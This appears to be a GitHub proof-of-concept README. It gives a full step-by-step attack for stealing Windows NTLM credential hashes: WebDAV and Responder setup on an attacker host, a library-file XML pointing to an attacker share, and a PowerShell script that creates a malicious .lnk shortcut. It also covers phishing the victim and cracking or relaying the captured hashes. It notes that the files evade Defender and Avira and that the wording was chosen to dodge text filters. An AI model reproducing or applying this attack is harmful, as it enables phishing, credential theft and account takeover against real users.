# lnk-with-Webdav-POC
Windows Defender and Avira AV Does not flag the Lnk as malicious.
### Tested on
```
Windows 10 Pro
BuildNumber     : 19045
Version         : 10.0.19045

Windows 11
BuildNumber     : 22000
Version         : 10.0.22000
```
 ## Youtube Demo 📹
 https://youtu.be/-sw7Sdkfh-U
### Requirements ⚙️
* Python3

### Setup 🛠️
<b> On the kali linux attacker machine, on the terminal</b> <br />
```
pip3 install wsgidav
mkdir /home/kali/webdav

Running the wsgidav hosted on /home/kali/webdav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/ 
```
<b> On the kali linux attacker machine, on a new tab of the terminal. run responder to capture NTLM hash</b> <br />
```
responder -I eth0 -dwFP -v
```
![image](https://github.com/2102596sit/lnk-with-Webdav-POC/assets/90232201/c1f59930-d518-4fa1-9cd2-4f42799c80d5)

Ensure that SMB server is on

![image](https://github.com/2102596sit/lnk-with-Webdav-POC/assets/90232201/1715fa7b-bf04-4c1a-97e1-7e967ddab24f)

### On windows attacker machine

## Creating the Window library file to connect to our webdav share. 
This file can be used as a virtual containers to carry our payloads to avoid suspicions. 
we can use Notepad or any text editor could also be used to create the file.

We can save the file HRFolder.
![image](https://github.com/2102596sit/lnk-with-Webdav-POC/assets/90232201/c660329d-b3db-4fca-be8a-5f429461f8f4)

Library files consist of three major parts and are written in XML to specify the parameters for accessing remote locations. The parts are General library information, Library properties, and Library locations. Let's build the XML code by adding and explain the tags. We can refer to the Library Description Schema6 for further information. We'll begin by adding the XML and library file's format version.
The listing below contains the namespace for the library file. This is the namespace for the version of the library file format starting from Windows 7. The listing also contains the closing tag for the library description. All of the following tags we cover will be added inside the libraryDescription tags.
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
</libraryDescription>
```
Next, we'll add two tags providing information about the library. The name tag specifies the name of this library. We must not confuse this with an arbitrary name we can just set randomly. 
We need to specify the name of the library by providing a DLL name and index. We can use @shell32.dll,-34575 or @windows.storage.dll,-34582 as specified on the Microsoft website. 
We'll use the latter to avoid any issues with text-based filters that may flag on "shell32". 
The version tag can be set to a numerical value of our choice, for example, 7.
```
<name>@windows.storage.dll,-34582</name>
<version>7</version>
```
Name and Version Tags of the Library

Next, we'll add the isLibraryPinned tag. This element specifies if the library is pinned to the navigation pane in Windows Explorer. 
The next tag we'll add is iconReference, which determines what icon is used to display the library file. We must specify the value in the same format as the name element. 
We can use imagesres.dll to choose between all Windows icons. We can use index "-1002" for the Documents folder icon.
```
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1002</iconReference>
```


The next tag marks the beginning of the library locations section. In this section, we specify the storage location where our library file should point to. We'll begin by creating the searchConnectorDescriptionList, tag which contains a list of search connectors defined by searchConnectorDescription. 
Search connectors are used by library files to specify the connection settings to a remote location. 

We can specify one or more searchConnectorDescription elements inside the searchConnectorDescriptionList tags. 
For this example we only specify one. If we used more than 1 folder, it will display contents from other folders as well making it look more legitimate.
Inside the description of the search connector, we'll specify information and parameters for our WebDAV share. The first tag we'll add is the isDefaultSaveLocation tag with the value set to true. 
This tag determines the behavior of Windows Explorer when a user chooses to save an item. To use the default behavior and location, we'll set it to true. Next, we'll add the isSupported tag, which is not documented in the Microsoft Documentation webpage, and is used for compatibility. We can set it to false.

**The most important tag is url,which we need to point to our previously-created WebDAV share over HTTP. It is contained within the simpleLocation tags, which we can use to specify the remote location in a more user-friendly way as the normal locationProvider element.**
```
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://<your webdav share url></url></simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
```
The entire XML would look something like this
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>7</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.1.67</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
## Creating the Windows shortcut payload using powershell
Run this on powershell to create the shortcut on your desktop, change the $shortcutPath accordingly 
```
$targetPath = "\\192.168.1.67\test"
$shortcutPath = "C:\Users\JJ\Desktop\HRdocuments.lnk"

# Create a WScript.Shell object 
$shell = New-Object -ComObject WScript.Shell
 # Create a shortcut object 
$shortcut = $shell.CreateShortcut($shortcutPath)
 # Set the target path of the shortcut
 $shortcut.TargetPath = $targetPath
 # Save the shortcut 
$shortcut.Save()
```
![image](https://github.com/2102596sit/lnk-with-Webdav-POC/assets/90232201/455d1c59-c587-49b1-8085-87cbf52687ef)

### Next, we could move the .lnk inside the webdav share directory
![image](https://github.com/2102596sit/lnk-with-Webdav-POC/assets/90232201/eb2f568c-06d1-4caa-a248-06d89dbd132a)

# Send the Windows library file to the victim, for e.g phishing email.
Giving instructions for the user to click on the hr folder, and the windows shortcut.
The responder should be able to harvest the credentials hash successfully.
# We can then either crack the hash for the user password or we can relay them to a tool like ntlmrelayx, or pass the hash directly for authentication as potential exploitations
![image](https://github.com/2102596sit/lnk-with-Webdav-POC/assets/90232201/154a6e66-51cb-4b7c-a0cc-233959918bcd)
_responder's captured credentials NTLMv2_

## Using hashcat to crack the NTLM hash recovered
![image](https://github.com/2102596sit/lnk-with-Webdav-POC/assets/90232201/2c926b5a-bb79-45b6-820b-650dd96d8df7)
![image](https://github.com/2102596sit/lnk-with-Webdav-POC/assets/90232201/b9b70946-b037-49dc-a334-d86cf4dcd92a)


